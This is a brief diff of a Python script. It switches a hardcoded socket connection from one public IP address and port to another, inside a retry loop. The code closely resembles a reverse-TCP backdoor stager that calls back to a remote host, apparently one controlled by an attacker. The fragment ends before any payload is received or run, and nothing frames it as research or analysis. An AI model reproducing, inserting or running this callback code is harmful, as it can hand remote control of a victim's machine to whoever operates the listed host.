@@ -5,7 +5,7 @@ import socket,struct,time
 for x in range(10):
         try:
                 s=socket.socket(2,socket.SOCK_STREAM)
-                s.connect(('3.19.114.185',10930))
+                s.connect(('3.14.212.173',19465))
                 break
         except:
                 time.sleep(5)
